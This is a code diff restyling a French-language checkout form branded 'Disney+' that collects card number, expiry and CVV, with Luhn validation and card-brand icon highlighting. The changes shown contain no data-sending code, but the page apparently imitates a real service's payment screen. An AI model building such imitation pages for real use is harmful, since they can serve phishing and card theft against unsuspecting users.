@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Paiement | Disney+</title>
-  <link rel="stylesheet" href="style.css" />
   <style>
     body {
       margin: 0;
@@ -37,14 +36,36 @@
     }
 
     form {
-      background-color: rgba(0, 0, 0, 0.6);
+      background-color: rgba(0, 0, 0, 0.65);
       padding: 30px;
       border-radius: 10px;
       display: flex;
       flex-direction: column;
-      gap: 15px;
+      gap: 20px;
       width: 100%;
-      max-width: 400px;
+      max-width: 420px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 2rem;
+      margin-bottom: 10px;
+      text-shadow: 0 0 6px rgba(0,0,0,0.5);
+    }
+
+    .subscription-summary {
+      background-color: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .input-group {
+      display: flex;
+      gap: 10px;
     }
 
     input {
@@ -52,6 +73,8 @@
       border-radius: 5px;
       border: none;
       font-size: 1rem;
+      width: 100%;
+      box-sizing: border-box;
     }
 
     button {
@@ -68,18 +91,6 @@
       background-color: #0483ee;
     }
 
-    .card-icon {
-      height: 30px;
-      margin-left: auto;
-    }
-
-    .subscription-summary {
-      background-color: rgba(255, 255, 255, 0.1);
-      padding: 15px;
-      border-radius: 8px;
-      font-size: 0.95rem;
-    }
-
     .loader {
       display: none;
       border: 4px solid #f3f3f3;
@@ -88,12 +99,40 @@
       width: 30px;
       height: 30px;
       animation: spin 1s linear infinite;
-      margin: 0 auto;
+      margin: 10px auto;
     }
 
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
+    }
+
+    .card-icons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      align-items: center;
+      margin-top: -10px;
+    }
+
+    .card-icons img {
+      width: 50px;
+      height: auto;
+      opacity: 0.3;
+      filter: grayscale(100%);
+      transition: all 0.3s ease;
+    }
+
+    .card-icons img.active {
+      opacity: 1;
+      filter: grayscale(0%);
+      transform: scale(1.1);
+    }
+
+    @media screen and (max-width: 480px) {
+      .input-group {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
@@ -111,23 +150,28 @@
     </div>
 
     <form id="paymentForm">
-      <div style="display: flex; align-items: center; gap: 10px;">
-        <input id="cardNumber" type="text" placeholder="Numéro de carte" maxlength="19" required style="flex: 1;" />
-        <img id="cardIcon" class="card-icon" src="" alt="" />
+      <input id="cardNumber" type="text" placeholder="Numéro de carte" maxlength="19" required />
+
+      <div class="input-group">
+        <input type="text" placeholder="MM/AA" maxlength="5" required />
+        <input type="text" placeholder="CVV" maxlength="4" required />
       </div>
-      <input type="text" placeholder="MM/AA" maxlength="5" required />
-      <input type="text" placeholder="CVV" maxlength="4" required />
+
+      <div class="card-icons">
+        <img src="Images/visa.png" id="visaIcon" alt="Visa">
+        <img src="Images/Mastercard.png" id="masterIcon" alt="Mastercard">
+        <img src="Images/Amex.png" id="amexIcon" alt="Amex">
+      </div>
+
       <div class="loader" id="loader"></div>
       <button type="submit">Payer</button>
     </form>
   </main>
 
   <script>
-    // Luhn Algorithm to validate card numbers
     function isValidCardNumber(number) {
       number = number.replace(/\s+/g, '');
-      let sum = 0;
-      let shouldDouble = false;
+      let sum = 0, shouldDouble = false;
       for (let i = number.length - 1; i >= 0; i--) {
         let digit = parseInt(number.charAt(i));
         if (shouldDouble) {
@@ -140,31 +184,31 @@
       return sum % 10 === 0;
     }
 
-    // Detect card type
     function detectCardType(number) {
       number = number.replace(/\s+/g, '');
       if (/^4/.test(number)) return 'visa';
       if (/^5[1-5]/.test(number)) return 'mastercard';
+      if (/^3[47]/.test(number)) return 'amex';
       return '';
     }
 
     const cardInput = document.getElementById('cardNumber');
-    const cardIcon = document.getElementById('cardIcon');
+    const icons = {
+      visa: document.getElementById('visaIcon'),
+      mastercard: document.getElementById('masterIcon'),
+      amex: document.getElementById('amexIcon')
+    };
 
     cardInput.addEventListener('input', () => {
       let value = cardInput.value.replace(/\D/g, '').slice(0, 16);
       cardInput.value = value.replace(/(.{4})/g, '$1 ').trim();
 
       const type = detectCardType(value);
-      if (type === 'visa') {
-        cardIcon.src = 'Images/visa.png';
-        cardIcon.alt = 'Visa';
-      } else if (type === 'mastercard') {
-        cardIcon.src = 'Images/mastercard.png';
-        cardIcon.alt = 'Mastercard';
-      } else {
-        cardIcon.src = '';
-        cardIcon.alt = '';
+      for (let key in icons) {
+        icons[key].classList.remove('active');
+      }
+      if (type && icons[type]) {
+        icons[type].classList.add('active');
       }
     });
 
